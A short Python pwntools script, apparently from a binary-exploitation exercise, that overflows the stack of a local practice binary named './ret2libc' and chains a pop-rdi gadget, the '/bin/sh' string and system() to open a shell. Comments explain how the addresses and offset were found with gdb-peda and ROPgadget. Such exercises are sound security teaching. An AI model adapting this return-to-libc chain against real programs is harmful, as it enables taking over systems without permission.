#!/usr/bin/env python3
from pwn import *

BIN = "./ret2libc"

context.binary = BIN

# Both system and the string "/bin/sh" are in libc; as such they will be in the
# memory region where libc was mapped. Unlike the stack, this does not
# (usually?) vary between gdb and the outside environment, so no adjustment is
# needed

# gdb-peda$ p system
system_addr = 0x7ffff7e10830

# gdb-peda$ find "/bin/sh"
binsh_addr = 0x7ffff7f53e78

# Use peda, or a toop like ropper, ROPgadget etc.
poprdi = 0x00000000004011e3

# static analysis or pattc+patto from peda
ret_offset = 0x80 + 8

payload = b""
payload += ret_offset * b"A"
payload += pack(poprdi)
payload += pack(binsh_addr)
payload += pack(system_addr)

io = process(BIN)
io.send(payload)
io.interactive()
